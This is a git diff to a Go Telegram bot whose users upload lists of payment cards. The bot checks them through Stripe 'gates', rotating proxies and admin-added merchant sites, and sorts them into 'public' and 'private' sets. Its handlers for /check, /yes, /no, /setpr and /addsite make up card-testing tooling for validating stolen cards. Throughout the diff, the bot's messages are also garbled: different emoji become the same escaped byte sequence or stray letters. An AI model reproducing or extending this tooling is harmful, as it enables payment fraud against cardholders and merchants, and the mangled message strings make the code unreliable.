+	bot.Handle("/check", func(c tele.Context) error {
+		uid := c.Sender().ID
+		if _, running := activeSessions.Load(uid); running {
+			return c.Send(em(emojiWarn, "\xe2\x9c\x85")+" You already have an active session. Wait for it to finish.", tele.ModeHTML)
+		}
+
+		msg := c.Message()
+		var doc *tele.Document
+		if msg.Document != nil {
+			doc = msg.Document
+		} else if msg.ReplyTo != nil && msg.ReplyTo.Document != nil {
+			doc = msg.ReplyTo.Document
+		}
+		if doc == nil {
+			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Reply to a .txt file with /check or attach a .txt file with /check as caption", tele.ModeHTML)
+		}
+
+		rc, err := bot.File(&doc.File)
+		if err != nil {
+			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Failed to download file: "+err.Error(), tele.ModeHTML)
+		}
+		data, err := io.ReadAll(rc)
+		rc.Close()
+		if err != nil {
+			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Failed to read file: "+err.Error(), tele.ModeHTML)
+		}
+
+		if len(data) == 0 {
+			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" File is empty", tele.ModeHTML)
+		}
+
+		prog, _ := bot.Send(c.Chat(), em(emojiSearch, "\xf0\x9f\x94\x8d")+" Checking...", tele.ModeHTML)
+
+		go func() {
+			result, err := antipublicCheck(data, doc.FileName)
+			if err != nil {
+				bot.Edit(prog, em(emojiCross, "\xe2\x9c\x85")+" "+err.Error(), tele.ModeHTML)
+				return
+			}
+
+			bot.Edit(prog, em(emojiCheck, "\xe2\x9c\x85")+" Check completed", tele.ModeHTML)
+
+			if result.StatsText != "" {
+				cleanStats := strings.ReplaceAll(result.StatsText, "**", "")
+				bot.Send(c.Chat(), cleanStats, tele.ModeDefault)
+			} else {
+				total := result.PublicCount + result.PrivateCount
+				pct := "0%"
+				if total > 0 {
+					pct = fmt.Sprintf("%.2f%%", float64(result.PrivateCount)/float64(total)*100)
+				}
+				bot.Send(c.Chat(), fmt.Sprintf(em(emojiCheck, "\xe2\x9c\x85")+" Check results:\nTotal cards: %d\nPrivate: %d  Public: %d\nPrivate percentage: %s", total, result.PrivateCount, result.PublicCount, pct), tele.ModeHTML)
+			}
+
+			if len(result.Public) > 0 {
+				bot.Send(c.Chat(), &tele.Document{
+					File:     tele.FromReader(bytes.NewReader([]byte(result.Public))),
+					FileName: "public.txt",
+				})
+			}
+			if len(result.Private) > 0 {
+				bot.Send(c.Chat(), &tele.Document{
+					File:     tele.FromReader(bytes.NewReader([]byte(result.Private))),
+					FileName: "private.txt",
+				})
+			}
+		}()
+
+		return nil
+	})
+
 	bot.Handle("/yes", func(c tele.Context) error {
 		uid := c.Sender().ID
 		txtPendingMu.Lock()
@@ -1275,37 +2060,42 @@ func main() {
 		}
 		txtPendingMu.Unlock()
 		if !ok {
-			return c.Send(em(emojiCross, "❌")+" No pending session. Use /txt first.", tele.ModeHTML)
+			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" No pending session. Use /txt first.", tele.ModeHTML)
 		}
 		if _, running := activeSessions.Load(uid); running {
-			return c.Send(em(emojiWarn, "⚠️")+" You already have an active session.", tele.ModeHTML)
+			return c.Send(em(emojiWarn, "\xe2\x9c\x85")+" You already have an active session.", tele.ModeHTML)
+		}
+		um.SetUsername(uid, c.Sender().Username)
+		if !requireCredits(c, um) {
+			return nil
 		}
 		sess := &CheckSession{
-			UserID:       uid,
-			Username:     pd.Username,
-			SessionID:    generateSessionID(),
-			Cards:        pd.Cards,
-			Total:        len(pd.Cards),
-			StartTime:    time.Now(),
-			ShowDecl:     false,
-			ShowApproved: true,
-			Done:         make(chan struct{}),
+			UserID:          uid,
+			Username:        pd.Username,
+			SessionID:       generateSessionID(),
+			Cards:           pd.Cards,
+			OriginalIndices: pd.OriginalIndices,
+			Total:           len(pd.Cards),
+			StartTime:       time.Now(),
+			ShowDecl:        false,
+			ShowApproved:    true,
+			Done:            make(chan struct{}),
+			ledger:          ledger,
 		}
 		activeSessions.Store(uid, sess)
 		ud := um.Get(uid)
 		proxies := make([]string, len(ud.Proxies))
 		copy(proxies, ud.Proxies)
-		c.Send(em(emojiLightning, "🚀")+fmt.Sprintf(" Starting check of %d cards (approved: ON)", len(pd.Cards)), tele.ModeHTML)
+		c.Send(em(emojiLightning, "\xe2\x9c\x85")+fmt.Sprintf(" Starting check of %d cards (approved: ON)", len(pd.Cards)), tele.ModeHTML)
 		if pd.CheckFn != nil {
 			sess.GatewayName = pd.GateName
-			go runStripeGateSession(bot, &tele.Chat{ID: pd.ChatID}, sess, proxies, um, fwd, pd.CheckFn)
+			go runStripeGateSession(bot, &tele.Chat{ID: pd.ChatID}, sess, proxies, um, pd.CheckFn)
 		} else {
-			go runSession(bot, &tele.Chat{ID: pd.ChatID}, sess, proxies, um, reduceKey, fwd)
+			go runSession(bot, &tele.Chat{ID: pd.ChatID}, sess, proxies, um)
 		}
 		return nil
 	})
 
-	// /no — start txt session with approved hidden
 	bot.Handle("/no", func(c tele.Context) error {
 		uid := c.Sender().ID
 		txtPendingMu.Lock()
@@ -1315,45 +2105,47 @@ func main() {
 		}
 		txtPendingMu.Unlock()
 		if !ok {
-			return c.Send(em(emojiCross, "❌")+" No pending session. Use /txt first.", tele.ModeHTML)
+			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" No pending session. Use /txt first.", tele.ModeHTML)
 		}
 		if _, running := activeSessions.Load(uid); running {
-			return c.Send(em(emojiWarn, "⚠️")+" You already have an active session.", tele.ModeHTML)
+			return c.Send(em(emojiWarn, "\xe2\x9c\x85")+" You already have an active session.", tele.ModeHTML)
+		}
+		um.SetUsername(uid, c.Sender().Username)
+		if !requireCredits(c, um) {
+			return nil
 		}
 		sess := &CheckSession{
-			UserID:       uid,
-			Username:     pd.Username,
-			SessionID:    generateSessionID(),
-			Cards:        pd.Cards,
-			Total:        len(pd.Cards),
-			StartTime:    time.Now(),
-			ShowDecl:     false,
-			ShowApproved: false,
-			Done:         make(chan struct{}),
+			UserID:          uid,
+			Username:        pd.Username,
+			SessionID:       generateSessionID(),
+			Cards:           pd.Cards,
+			OriginalIndices: pd.OriginalIndices,
+			Total:           len(pd.Cards),
+			StartTime:       time.Now(),
+			ShowDecl:        false,
+			ShowApproved:    false,
+			Done:            make(chan struct{}),
+			ledger:          ledger,
 		}
 		activeSessions.Store(uid, sess)
 		ud := um.Get(uid)
 		proxies := make([]string, len(ud.Proxies))
 		copy(proxies, ud.Proxies)
-		c.Send(em(emojiLightning, "🚀")+fmt.Sprintf(" Starting check of %d cards (approved: OFF)", len(pd.Cards)), tele.ModeHTML)
+		c.Send(em(emojiLightning, "\xe2\x9c\x85")+fmt.Sprintf(" Starting check of %d cards (approved: OFF)", len(pd.Cards)), tele.ModeHTML)
 		if pd.CheckFn != nil {
 			sess.GatewayName = pd.GateName
-			go runStripeGateSession(bot, &tele.Chat{ID: pd.ChatID}, sess, proxies, um, fwd, pd.CheckFn)
+			go runStripeGateSession(bot, &tele.Chat{ID: pd.ChatID}, sess, proxies, um, pd.CheckFn)
 		} else {
-			go runSession(bot, &tele.Chat{ID: pd.ChatID}, sess, proxies, um, reduceKey, fwd)
+			go runSession(bot, &tele.Chat{ID: pd.ChatID}, sess, proxies, um)
 		}
 		return nil
 	})
 
-	// /setpr <proxy> (supports multiple proxies, one per line)
 	bot.Handle("/setpr", func(c tele.Context) error {
-		// Payload only captures the first line — use full Text instead
 		fullText := c.Message().Text
-		// Strip the /setpr command (may include @botname)
 		idx := strings.Index(fullText, "/setpr")
 		if idx >= 0 {
 			after := fullText[idx+len("/setpr"):]
-			// Strip optional @botname
 			if len(after) > 0 && after[0] == '@' {
 				if sp := strings.IndexAny(after, " \n"); sp >= 0 {
 					after = after[sp:]
@@ -1364,25 +2156,56 @@ func main() {
 			fullText = after
 		}
 		raw := strings.TrimSpace(fullText)
-		if raw == "" {
-			return c.Send("Usage: /setpr proxy1\\nproxy2\\nproxy3\\n...")
+
+		var rawProxies []string
+
+		if msg := c.Message(); msg != nil {
+			doc := msg.Document
+			if doc == nil && msg.ReplyTo != nil {
+				doc = msg.ReplyTo.Document
+			}
+			if doc != nil && (strings.HasSuffix(strings.ToLower(doc.FileName), ".txt") || doc.MIME == "text/plain") {
+				rc, err := bot.File(&doc.File)
+				if err != nil {
+					return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Failed to download file: "+err.Error(), tele.ModeHTML)
+				}
+				data, err := io.ReadAll(rc)
+				rc.Close()
+				if err != nil {
+					return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Failed to read file: "+err.Error(), tele.ModeHTML)
+				}
+
+				for _, line := range strings.Split(strings.ReplaceAll(string(data), "\r\n", "\n"), "\n") {
+					line = strings.TrimSpace(line)
+					if line != "" && !strings.HasPrefix(line, "#") {
+						rawProxies = append(rawProxies, line)
+					}
+				}
+				if len(rawProxies) == 0 {
+					return c.Send(em(emojiCross, "\xe2\x9c\x85")+" No proxies found in file", tele.ModeHTML)
+				}
+				raw = strings.Join(rawProxies, "\n")
+			}
 		}
 
-		// Split by newlines to support multiple proxies
-		var rawProxies []string
-		for _, line := range strings.Split(raw, "\n") {
-			line = strings.TrimSpace(line)
-			if line != "" {
-				rawProxies = append(rawProxies, line)
+		if raw == "" {
+			return c.Send("Usage: /setpr proxy1\\nproxy2\\nproxy3\\n...\nOr reply to a .txt file with /setpr")
+		}
+
+		if len(rawProxies) == 0 {
+			for _, line := range strings.Split(raw, "\n") {
+				line = strings.TrimSpace(line)
+				if line != "" {
+					rawProxies = append(rawProxies, line)
+				}
 			}
 		}
 		if len(rawProxies) == 0 {
-			return c.Send("❌ No proxies provided")
+			return c.Send("O No proxies provided")
 		}
 
 		ud := um.Get(c.Sender().ID)
 
-		// Pre-filter: normalize + dedup before testing
 		type proxyEntry struct {
 			normalized string
 			valid      bool
@@ -1413,7 +2236,7 @@ func main() {
 		}
 
 		if len(toTest) == 0 {
-			msg := em(emojiCross, "❌") + " No new proxies to test"
+			msg := em(emojiCross, "\xe2\x9c\x85") + " No new proxies to test"
 			if parseFail > 0 {
 				msg += fmt.Sprintf(" (%d invalid)", parseFail)
 			}
@@ -1423,9 +2246,8 @@ func main() {
 			return c.Send(msg, tele.ModeHTML)
 		}
 
-		c.Send(em(emojiSearch, "🔄")+fmt.Sprintf(" Testing %d proxy(s)...", len(toTest)), tele.ModeHTML)
+		c.Send(em(emojiSearch, "\xe2\x9c\x85")+fmt.Sprintf(" Testing %d proxy(s)...", len(toTest)), tele.ModeHTML)
 
-		// Test all proxies concurrently
 		var wg sync.WaitGroup
 		results := make([]bool, len(toTest))
 		for i := range toTest {
@@ -1453,33 +2275,32 @@ func main() {
 
 		um.Save()
 
-		msg := em(emojiCheck, "✅") + fmt.Sprintf(" %d proxy(s) added (%d total)", added, len(ud.Proxies))
+		msg := em(emojiCheck, "\xe2\x9c\x85") + fmt.Sprintf(" %d proxy(s) added (%d total)", added, len(ud.Proxies))
 		if failed > 0 {
-			msg += fmt.Sprintf("\n"+em(emojiCross, "❌")+" %d failed", failed)
+			msg += fmt.Sprintf("\n"+em(emojiCross, "\xe2\x9c\x85")+" %d failed", failed)
 		}
 		if dupes > 0 {
-			msg += fmt.Sprintf("\n"+em(emojiLightning, "⏭")+" %d duplicate(s) skipped", dupes)
+			msg += fmt.Sprintf("\n"+em(emojiLightning, "\xe2\x9c\x85")+" %d duplicate(s) skipped", dupes)
 		}
 		return c.Send(msg, tele.ModeHTML)
 	})
 
-	// /rmpr <proxy|all>
 	bot.Handle("/rmpr", func(c tele.Context) error {
 		raw := strings.TrimSpace(c.Message().Payload)
 		if raw == "" {
-			return c.Send("Usage: /rmpr <proxy> or /rmpr all")
+			return c.Send("Usage: /rmpr &lt;proxy&gt; or /rmpr all")
 		}
 
 		ud := um.Get(c.Sender().ID)
 		if strings.ToLower(raw) == "all" {
 			ud.Proxies = nil
 			um.Save()
-			return c.Send(em(emojiCheck, "✅")+" All proxies removed", tele.ModeHTML)
+			return c.Send(em(emojiCheck, "\xe2\x9c\x85")+" All proxies removed", tele.ModeHTML)
 		}
 
 		normalized, err := normalizeProxy(raw)
 		if err != nil {
-			return c.Send(em(emojiCross, "❌")+" Invalid proxy format: "+err.Error(), tele.ModeHTML)
+			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Invalid proxy format: "+err.Error(), tele.ModeHTML)
 		}
 		found := false
 		newList := make([]string, 0, len(ud.Proxies))
@@ -1491,33 +2312,39 @@ func main() {
 			newList = append(newList, p)
 		}
 		if !found {
-			return c.Send(em(emojiCross, "❌")+" Proxy not found in your list", tele.ModeHTML)
+			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Proxy not found in your list", tele.ModeHTML)
 		}
 		ud.Proxies = newList
 		um.Save()
-		return c.Send(em(emojiCheck, "✅")+fmt.Sprintf(" Proxy removed (%d remaining)", len(ud.Proxies)), tele.ModeHTML)
+		return c.Send(em(emojiCheck, "\xe2\x9c\x85")+fmt.Sprintf(" Proxy removed (%d remaining)", len(ud.Proxies)), tele.ModeHTML)
 	})
 
-	// /stop — stop own session
-	bot.Handle("/stop", func(c tele.Context) error {
+bot.Handle("/stop", func(c tele.Context) error {
 		uid := c.Sender().ID
 		val, ok := activeSessions.Load(uid)
 		if !ok {
-			return c.Send(em(emojiWarn, "⚠️")+" No active session to stop.", tele.ModeHTML)
+			return c.Send(em(emojiWarn, "\xe2\x9c\x85")+" No active session to stop.", tele.ModeHTML)
 		}
 		sess := val.(*CheckSession)
 		sess.Cancelled.Store(true)
 		if sess.Cancel != nil {
 			sess.Cancel()
 		}
-		c.Send(em(emojiCross, "🛑")+fmt.Sprintf(" Stopping session... (%d/%d done)", sess.Checked.Load(), sess.Total), tele.ModeHTML)
+		activeSessions.Delete(uid)
+		done := sess.Done
+		go func() {
+			select {
+			case <-done:
+			case <-time.After(5 * time.Second):
+			}
+		}()
+		c.Send(em(emojiCross, "\xe2\x9c\x85")+fmt.Sprintf(" Stopping session... (%d/%d done)", sess.Checked.Load(), sess.Total), tele.ModeHTML)
 		return nil
 	})
 
-	// /stopall — admin only, stop all sessions
 	bot.Handle("/stopall", func(c tele.Context) error {
 		if !isAdmin(c.Sender().ID) {
-			return c.Send(em(emojiCross, "❌")+" Only admin can use /stopall", tele.ModeHTML)
+			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Only admin can use /stopall", tele.ModeHTML)
 		}
 		count := 0
 		activeSessions.Range(func(key, val any) bool {
@@ -1526,66 +2353,66 @@ func main() {
 			if sess.Cancel != nil {
 				sess.Cancel()
 			}
+			activeSessions.Delete(key)
 			count++
 			return true
 		})
 		if count == 0 {
-			return c.Send(em(emojiWarn, "⚠️")+" No active sessions.", tele.ModeHTML)
+			return c.Send(em(emojiWarn, "\xe2\x9c\x85")+" No active sessions.", tele.ModeHTML)
 		}
-		return c.Send(em(emojiCross, "🛑")+fmt.Sprintf(" Stopping %d session(s)...", count), tele.ModeHTML)
+		return c.Send(em(emojiCross, "\xe2\x9c\x85")+fmt.Sprintf(" Stopping %d session(s)...", count), tele.ModeHTML)
 	})
 
-	// /ban <userid> — admin only
 	bot.Handle("/ban", func(c tele.Context) error {
 		if !isAdmin(c.Sender().ID) {
-			return c.Send(em(emojiCross, "❌")+" Only admin can use /ban", tele.ModeHTML)
+			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Only admin can use /ban", tele.ModeHTML)
 		}
 		raw := strings.TrimSpace(c.Message().Payload)
 		if raw == "" {
-			return c.Send("Usage: /ban <userid>")
+			return c.Send("Usage: /ban &lt;userid&gt;")
 		}
 		uid, err := strconv.ParseInt(raw, 10, 64)
 		if err != nil {
-			return c.Send(em(emojiCross, "❌")+" Invalid user ID", tele.ModeHTML)
+			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Invalid user ID", tele.ModeHTML)
 		}
 		if isAdmin(uid) {
-			return c.Send(em(emojiCross, "❌")+" Cannot ban admin", tele.ModeHTML)
+			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Cannot ban admin", tele.ModeHTML)
 		}
 		cfg.mu.Lock()
 		cfg.BannedUsers[uid] = true
 		cfg.mu.Unlock()
 		cfg.Save()
-		// Also stop their session if running
 		if val, ok := activeSessions.Load(uid); ok {
-			val.(*CheckSession).Cancel()
+			s := val.(*CheckSession)
+			s.Cancelled.Store(true)
+			s.Cancel()
+			activeSessions.Delete(uid)
 		}
-		return c.Send(em(emojiCheck, "✅")+fmt.Sprintf(" User %d banned.", uid), tele.ModeHTML)
+		return c.Send(em(emojiCheck, "\xe2\x9c\x85")+fmt.Sprintf(" User %d banned.", uid), tele.ModeHTML)
 	})
 
-	// /unban <userid> — admin only
 	bot.Handle("/unban", func(c tele.Context) error {
 		if !isAdmin(c.Sender().ID) {
-			return c.Send(em(emojiCross, "❌")+" Only admin can use /unban", tele.ModeHTML)
+			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Only admin can use /unban", tele.ModeHTML)
 		}
 		raw := strings.TrimSpace(c.Message().Payload)
 		if raw == "" {
-			return c.Send("Usage: /unban <userid>")
+			return c.Send("Usage: /unban &lt;userid&gt;")
 		}
 		uid, err := strconv.ParseInt(raw, 10, 64)
 		if err != nil {
-			return c.Send(em(emojiCross, "❌")+" Invalid user ID", tele.ModeHTML)
+			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Invalid user ID", tele.ModeHTML)
 		}
 		cfg.mu.Lock()
 		delete(cfg.BannedUsers, uid)
 		cfg.mu.Unlock()
 		cfg.Save()
-		return c.Send(em(emojiCheck, "✅")+fmt.Sprintf(" User %d unbanned.", uid), tele.ModeHTML)
+		return c.Send(em(emojiCheck, "\xe2\x9c\x85")+fmt.Sprintf(" User %d unbanned.", uid), tele.ModeHTML)
 	})
 
-	// /pvtonly — admin only, toggle private mode
 	bot.Handle("/pvtonly", func(c tele.Context) error {
 		if !isAdmin(c.Sender().ID) {
-			return c.Send(em(emojiCross, "❌")+" Only admin can use /pvtonly", tele.ModeHTML)
+			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Only admin can use /pvtonly", tele.ModeHTML)
 		}
 		cfg.mu.Lock()
 		cfg.PvtOnly = !cfg.PvtOnly
@@ -1593,60 +2420,57 @@ func main() {
 		cfg.mu.Unlock()
 		cfg.Save()
 		if state {
-			return c.Send(em(emojiCross, "🔒")+" Private mode ON — only allowed users can use the bot.", tele.ModeHTML)
+			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Private mode ON -> only allowed users can use the bot.", tele.ModeHTML)
 		}
-		return c.Send(em(emojiCheck, "🔓")+" Private mode OFF — everyone can use the bot.", tele.ModeHTML)
+		return c.Send(em(emojiCheck, "\xe2\x9c\x85")+" Private mode OFF -> everyone can use the bot.", tele.ModeHTML)
 	})
 
-	// /allowuser <userid> — admin only
 	bot.Handle("/allowuser", func(c tele.Context) error {
 		if !isAdmin(c.Sender().ID) {
-			return c.Send(em(emojiCross, "❌")+" Only admin can use /allowuser", tele.ModeHTML)
+			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Only admin can use /allowuser", tele.ModeHTML)
 		}
 		raw := strings.TrimSpace(c.Message().Payload)
 		if raw == "" {
-			return c.Send("Usage: /allowuser <userid>")
+			return c.Send("Usage: /allowuser &lt;userid&gt;")
 		}
 		uid, err := strconv.ParseInt(raw, 10, 64)
 		if err != nil {
-			return c.Send(em(emojiCross, "❌")+" Invalid user ID", tele.ModeHTML)
+			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Invalid user ID", tele.ModeHTML)
 		}
 		cfg.mu.Lock()
 		cfg.AllowedUsers[uid] = true
 		cfg.mu.Unlock()
 		cfg.Save()
-		return c.Send(em(emojiCheck, "✅")+fmt.Sprintf(" User %d allowed.", uid), tele.ModeHTML)
+		return c.Send(em(emojiCheck, "\xe2\x9c\x85")+fmt.Sprintf(" User %d allowed.", uid), tele.ModeHTML)
 	})
 
-	// /removeuser <userid> — admin only, remove from allowed list
 	bot.Handle("/removeuser", func(c tele.Context) error {
 		if !isAdmin(c.Sender().ID) {
-			return c.Send(em(emojiCross, "❌")+" Only admin can use /removeuser", tele.ModeHTML)
+			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Only admin can use /removeuser", tele.ModeHTML)
 		}
 		raw := strings.TrimSpace(c.Message().Payload)
 		if raw == "" {
-			return c.Send("Usage: /removeuser <userid>")
+			return c.Send("Usage: /removeuser &lt;userid&gt;")
 		}
 		uid, err := strconv.ParseInt(raw, 10, 64)
 		if err != nil {
-			return c.Send(em(emojiCross, "❌")+" Invalid user ID", tele.ModeHTML)
+			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Invalid user ID", tele.ModeHTML)
 		}
 		cfg.mu.Lock()
 		delete(cfg.AllowedUsers, uid)
 		cfg.mu.Unlock()
 		cfg.Save()
-		return c.Send(em(emojiCheck, "✅")+fmt.Sprintf(" User %d removed from allowed list.", uid), tele.ModeHTML)
+		return c.Send(em(emojiCheck, "\xe2\x9c\x85")+fmt.Sprintf(" User %d removed from allowed list.", uid), tele.ModeHTML)
 	})
 
-	// /split <N> — reply to a .txt file, splits it into N parts
 	bot.Handle("/split", func(c tele.Context) error {
 		raw := strings.TrimSpace(c.Message().Payload)
 		if raw == "" {
-			return c.Send("Usage: reply to a .txt file with /split <N>")
+			return c.Send("Usage: reply to a .txt file with /split &lt;N&gt;")
 		}
 		n, err := strconv.Atoi(raw)
 		if err != nil || n < 2 {
-			return c.Send("❌ Provide a number >= 2")
+			return c.Send("O Provide a number >= 2")
 		}
 
 		msg := c.Message()
@@ -1657,18 +2481,19 @@ func main() {
 			doc = msg.ReplyTo.Document
 		}
 		if doc == nil {
-			return c.Send("❌ Reply to a .txt file with /split <N> or attach a .txt file with /split as caption")
+			return c.Send("O Reply to a .txt file with /split &lt;N&gt; or attach a .txt file with /split as caption")
 		}
 
 		rc, err := bot.File(&doc.File)
 		if err != nil {
-			return c.Send("❌ Failed to download file: " + err.Error())
+			return c.Send("O Failed to download file: " + err.Error())
 		}
 		defer rc.Close()
 		data, err := io.ReadAll(rc)
 		if err != nil {
-			return c.Send("❌ Failed to read file: " + err.Error())
+			return c.Send("O Failed to read file: " + err.Error())
 		}
+
 
 		var lines []string
 		for _, line := range strings.Split(string(data), "\n") {
@@ -1678,7 +2503,7 @@ func main() {
 			}
 		}
 		if len(lines) == 0 {
-			return c.Send("❌ File is empty")
+			return c.Send("O File is empty")
 		}
 		if n > len(lines) {
 			n = len(lines)
@@ -1700,23 +2525,21 @@ func main() {
 			doc := &tele.Document{
 				File:     tele.FromReader(buf),
 				FileName: fname,
-				Caption:  fmt.Sprintf("📄 Part %d/%d (%d lines)", i+1, n, len(chunk)),
+				Caption:  fmt.Sprintf("Part %d/%d (%d lines)", i+1, n, len(chunk)),
 			}
 			bot.Send(c.Chat(), doc)
 		}
 		return nil
 	})
 
-	// /addsite — admin only, add custom sites (text or reply to .txt)
 	bot.Handle("/addsite", func(c tele.Context) error {
 		if !isAdmin(c.Sender().ID) {
-			return c.Send("❌ Only admin can use /addsite")
+			return c.Send("O Only admin can use /addsite")
 		}
 
 		var raw string
 		msg := c.Message()
 
-		// Check for attached or replied .txt file
 		var doc *tele.Document
 		if msg.Document != nil {
 			doc = msg.Document
@@ -1726,16 +2549,16 @@ func main() {
 		if doc != nil {
 			rc, err := bot.File(&doc.File)
 			if err != nil {
-				return c.Send("❌ Failed to download file: " + err.Error())
+				return c.Send("O Failed to download file: " + err.Error())
 			}
 			defer rc.Close()
-			data, err := io.ReadAll(rc)
-			if err != nil {
-				return c.Send("❌ Failed to read file: " + err.Error())
-			}
-			raw = string(data)
+data, err := io.ReadAll(rc)
+		if err != nil {
+			return c.Send("O Failed to read file: " + err.Error())
+		}
+
+		raw = string(data)
 		} else {
-			// Get text after /addsite command
 			fullText := msg.Text
 			idx := strings.Index(fullText, "/addsite")
 			if idx >= 0 {
@@ -1784,28 +2607,27 @@ func main() {
 		customSitesMu.Unlock()
 		saveCustomSites()
 
-		msgText := fmt.Sprintf("✅ Added %d site(s) (%d total custom sites)", added, total)
+		msgText := fmt.Sprintf("o. Added %d site(s) (%d total custom sites)", added, total)
 		if dupes > 0 {
-			msgText += fmt.Sprintf("\n⏭ %d duplicate(s) skipped", dupes)
+			msgText += fmt.Sprintf("\n %d duplicate(s) skipped", dupes)
 		}
 		return c.Send(msgText)
 	})
 
-	// /rmsite <site|all> — admin only
 	bot.Handle("/rmsite", func(c tele.Context) error {
 		if !isAdmin(c.Sender().ID) {
-			return c.Send("❌ Only admin can use /rmsite")
+			return c.Send("O Only admin can use /rmsite")
 		}
 		raw := strings.TrimSpace(c.Message().Payload)
 		if raw == "" {
-			return c.Send("Usage: /rmsite <site> or /rmsite all")
+			return c.Send("Usage: /rmsite &lt;site&gt; or /rmsite all")
 		}
 		if strings.ToLower(raw) == "all" {
 			customSitesMu.Lock()
 			customSites = nil
 			customSitesMu.Unlock()
 			saveCustomSites()
-			return c.Send("✅ All custom sites removed. Bot will use API sites.")
+			return c.Send("o. All custom sites removed. Bot will use API sites.")
 		}
 		site := strings.TrimRight(strings.TrimSpace(raw), "/")
 		if !strings.HasPrefix(site, "http") {
@@ -1825,26 +2647,24 @@ func main() {
 		remaining := len(customSites)
 		customSitesMu.Unlock()
 		if !found {
-			return c.Send("❌ Site not found in custom list")
+			return c.Send("O Site not found in custom list")
 		}
 		saveCustomSites()
 		if remaining == 0 {
-			return c.Send("✅ Site removed. No custom sites left — bot will use API sites.")
+			return c.Send("Site removed. No custom sites left -> bot will use API sites.")
 		}
-		return c.Send(fmt.Sprintf("✅ Site removed (%d remaining)", remaining))
+		return c.Send(fmt.Sprintf("o. Site removed (%d remaining)", remaining))
 	})
 
-	// /site <keyword> or /site all — admin only
 	bot.Handle("/site", func(c tele.Context) error {
 		if !isAdmin(c.Sender().ID) {
-			return c.Send("❌ Only admin can use /site")
+			return c.Send("O Only admin can use /site")
 		}
 		keyword := strings.TrimSpace(c.Message().Payload)
 		if keyword == "" {
-			return c.Send("Usage: /site <keyword>  or  /site all")
+			return c.Send("Usage: /site &lt;keyword&gt;  or  /site all")
 		}
 
-		// Gather all sites: custom + API pool
 		allSites := make(map[string]bool)
 		for _, s := range getCustomSites() {
 			allSites[s] = true
@@ -1857,7 +2677,7 @@ func main() {
 
 		if strings.ToLower(keyword) == "all" {
 			if len(allSites) == 0 {
-				return c.Send("📝 No sites available.")
+				return c.Send("No sites available.")
 			}
 			var list []string
 			for s := range allSites {
@@ -1868,7 +2688,7 @@ func main() {
 			doc := &tele.Document{
 				File:     tele.FromReader(buf),
 				FileName: "sites.txt",
-				Caption:  fmt.Sprintf("🌐 All sites (%d)", len(list)),
+				Caption:  fmt.Sprintf("YO All sites (%d)", len(list)),
 			}
 			return c.Send(doc)
 		}
@@ -1883,131 +2703,134 @@ func main() {
 		sort.Strings(matches)
 
 		if len(matches) == 0 {
-			return c.Send(fmt.Sprintf("🔍 No sites found containing \"%s\"", keyword))
+			return c.Send(fmt.Sprintf("No sites found containing \"%s\"", keyword))
 		}
 		var sb strings.Builder
-		sb.WriteString(fmt.Sprintf("🔍 Sites matching \"%s\" (%d):\n\n", keyword, len(matches)))
+		sb.WriteString(fmt.Sprintf("Sites matching \"%s\" (%d):\n\n", keyword, len(matches)))
 		for i, s := range matches {
 			sb.WriteString(fmt.Sprintf("%d. %s\n", i+1, s))
 		}
 		return c.Send(sb.String())
 	})
 
-	// /stats — global stats for all users
 	bot.Handle("/stats", func(c tele.Context) error {
 		return c.Send(formatStatsMsg(um), tele.ModeHTML)
 	})
 
-	// /active
 	bot.Handle("/active", func(c tele.Context) error {
 		return c.Send(formatActiveMsg(), tele.ModeHTML)
 	})
 
-	// /admin — list admin commands
-	bot.Handle("/admin", func(c tele.Context) error {
+bot.Handle("/admin", func(c tele.Context) error {
 		if !isAdmin(c.Sender().ID) {
-			return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
+			return c.Send(" Admin only.", tele.ModeHTML)
 		}
 		return c.Send(
-			"━━━━━━━━━━━━━━━━━━━━━━\n"+
-				"  "+em("5296369303661067030", "🔧")+" 𝗔𝗱𝗺𝗶𝗻 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀 "+em("5264727218734524899", "🔧")+"\n"+
-				"━━━━━━━━━━━━━━━━━━━━━━\n\n"+
-				em("5341715473882955310", "🔴")+"  /broadcast &lt;msg&gt;        — All users\n"+
-				em("5341715473882955310", "🔴")+"  /broadcastuser &lt;id&gt; &lt;m&gt; — Specific user\n"+
-				em("5215668805199473901", "🔴")+"  /broadcastactive &lt;msg&gt;  — Active sessions\n\n"+
-				em("5215668805199473901", "🚫")+"  /ban &lt;id&gt;          — Ban user\n"+
-				em("5215668805199473901", "✅")+"  /unban &lt;id&gt;        — Unban user\n"+
-				em("5240241223632954241", "🔒")+"  /pvtonly           — Toggle private mode\n"+
-				em("5352658337588612223", "👤")+"  /allowuser &lt;id&gt;    — Allow user\n"+
-				em("6003424016977628379", "❌")+"  /removeuser &lt;id&gt;   — Remove allowed user\n"+
-				em("5974048815789903111", "👥")+"  /users             — List allowed users\n\n"+
-				em("6060081662178365254", "🔒")+"  /restrict all|&lt;ids&gt;    — Block all or specific IDs\n"+
-				em("6001526766714227911", "🔓")+"  /unrestrict all|&lt;ids&gt;  — Lift restrictions\n"+
-				em("5296369303661067030", "🔐")+"  /allowonly &lt;ids&gt;       — Allow only specific IDs\n"+
-				em("5296369303661067030", "🔓")+"  /allowall              — Reset all access restrictions\n\n"+
-				em("6294100961119966181", "👑")+"  /admins            — List all admins\n"+
-				em("5393194986252542669", "➕")+"  /addadmin &lt;id&gt;     — Add dynamic admin\n"+
